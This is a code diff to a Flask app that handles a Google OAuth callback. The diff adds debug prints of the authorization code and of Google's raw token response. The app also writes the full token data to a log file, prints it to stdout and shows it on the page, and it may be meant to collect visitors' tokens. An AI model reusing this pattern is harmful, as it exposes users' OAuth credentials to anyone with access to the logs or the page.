@@ -6,7 +6,7 @@ import os
 
 app = Flask(__name__)
 
-# Load from Render environment variables
+# Load from environment variables
 CLIENT_ID = os.environ.get("CLIENT_ID")
 CLIENT_SECRET = os.environ.get("CLIENT_SECRET")
 REDIRECT_URI = os.environ.get("REDIRECT_URI")
@@ -17,7 +17,7 @@ print("DEBUG: REDIRECT_URI =", repr(REDIRECT_URI))
 
 assert CLIENT_ID and CLIENT_SECRET and REDIRECT_URI, "OAuth credentials not set"
 
-# Log to file + enable stdout logging for Render
+# File + stdout logging
 logging.basicConfig(filename='access.log', level=logging.INFO, format='%(asctime)s %(message)s')
 
 @app.route('/')
@@ -41,7 +41,11 @@ def go():
 
 @app.route('/callback')
 def callback():
+    print("[CALLBACK HIT]")
+
     code = request.args.get("code")
+    print("Code received:", code)
+
     if not code:
         return "Missing ?code=", 400
 
@@ -55,6 +59,9 @@ def callback():
 
     try:
         response = requests.post("https://oauth2.googleapis.com/token", data=data)
+        print("[GOOGLE RESPONSE STATUS]:", response.status_code)
+        print("[GOOGLE RESPONSE TEXT]:", response.text)
+
         response.raise_for_status()
         token_data = response.json()
 
@@ -62,13 +69,15 @@ def callback():
         with open("tokens.log", "a") as f:
             f.write(f"[TOKEN RECEIVED]\n{token_data}\n\n")
 
-        # Print to stdout (Render logs)
+        # Print to stdout
         print(f"[TOKEN RECEIVED]\n{token_data}\n")
 
         return f"<h1>Access Granted</h1><pre>{token_data}</pre>"
 
     except requests.exceptions.RequestException as e:
         print(f"[TOKEN EXCHANGE ERROR] {str(e)}")
+        if response is not None:
+            print(f"[TOKEN RESPONSE TEXT] {response.text}")
         return f"<h1>Token exchange failed:</h1><pre>{str(e)}</pre>", 500
 
 if __name__ == '__main__':
